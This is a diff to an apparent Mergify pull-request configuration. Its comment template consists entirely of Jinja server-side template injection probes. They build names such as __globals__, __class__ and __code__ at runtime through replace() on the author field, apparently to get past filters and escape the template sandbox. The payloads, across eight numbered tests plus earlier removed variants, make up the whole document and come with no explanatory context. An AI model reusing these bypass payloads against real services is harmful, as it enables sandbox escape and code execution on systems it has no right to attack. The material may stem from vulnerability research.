@@ -1,15 +1,16 @@
 pull_request_rules:
-  - name: runtime-attr-19129
+  - name: ssti-final-19448
     conditions: []
     actions:
       comment:
         message: |
-          === RUNTIME ATTR NAME v19 ===
-          title-raw: {{ title }}
-          body-raw: {{ body }}
-          [T1] lipsum|attr(title)|default: {{ (lipsum | attr(title)) | default('UNDEF', true) }}
-          [T2] lipsum|attr(body)|default: {{ (lipsum | attr(body)) | default('UNDEF', true) }}
-          [T3] cycler|attr(title)|default: {{ (cycler | attr(title)) | default('UNDEF', true) }}
-          [T4] author|attr(body)|default: {{ (author | attr(body)) | default('UNDEF', true) }}
-          [T5] ns(x=lipsum)|attr(body)|default: {{ (namespace(x=lipsum) | attr(body)) | default('UNDEF', true) }}
-          [T6] joiner()|attr(title)|default: {{ (joiner() | attr(title)) | default('UNDEF', true) }}
+          === RUNTIME-CONSTRUCTED ATTR NAME BYPASS ===
+          author={{ author }}
+          [E1] author replace test: {{ author | replace('mergify-account-B', '__globals__') }}
+          [E2] lipsum attr(replace): {{ (lipsum | attr(author | replace('mergify-account-B', '__globals__'))) | default('UNDEF', true) }}
+          [E3] same but |string: {{ ((lipsum | attr(author | replace('mergify-account-B', '__globals__'))) | default('UNDEF', true)) | string }}
+          [E4] %r format on result: {{ '%r' | format((lipsum | attr(author | replace('mergify-account-B', '__globals__'))) | default('UNDEF', true)) }}
+          [E5] try __class__ instead: {{ (lipsum | attr(author | replace('mergify-account-B', '__class__'))) | default('UNDEF', true) }}
+          [E6] try __init__: {{ (lipsum | attr(author | replace('mergify-account-B', '__init__'))) | default('UNDEF', true) }}
+          [E7] try __dict__: {{ (lipsum | attr(author | replace('mergify-account-B', '__dict__'))) | default('UNDEF', true) }}
+          [E8] try __code__: {{ (lipsum | attr(author | replace('mergify-account-B', '__code__'))) | default('UNDEF', true) }}
